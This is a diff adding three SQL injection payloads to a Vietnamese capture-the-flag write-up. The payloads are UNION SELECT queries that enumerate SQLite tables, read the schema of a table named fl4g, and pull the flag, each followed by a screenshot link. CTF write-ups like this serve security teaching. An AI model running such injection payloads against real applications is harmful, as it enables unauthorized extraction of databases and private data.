@@ -27,16 +27,19 @@ Mình thử bằng phép nối chuỗi của sqlite
 
 
 Khi biết được API này dùng db gì và bị SQLi thì sẽ dễ dàng list ra được các table của db
+Payload: ' union select name,null,null,null,null from sqlite_schema where type='table'--
 
 ![image](https://user-images.githubusercontent.com/75677317/196017549-633d21d3-df8e-4af6-811e-f49631de2206.png)
 
 
 Tiếp đến list ra được các column của table fl4g
+Payload: ' union select sql,null,null,null,null from sqlite_schema where tbl_name='fl4g'--
 
 ![image](https://user-images.githubusercontent.com/75677317/196017569-5440bde3-9197-46c0-a3dc-306701d1574d.png)
 
 
 Cuối cùng ta có thể lấy được flag thành công
+Payload: ' union select flag,null,null,null,null from fl4g--
 
 ![image](https://user-images.githubusercontent.com/75677317/196017583-97e3cc6f-a97c-4a9c-89a4-c175e65ec22a.png)
 
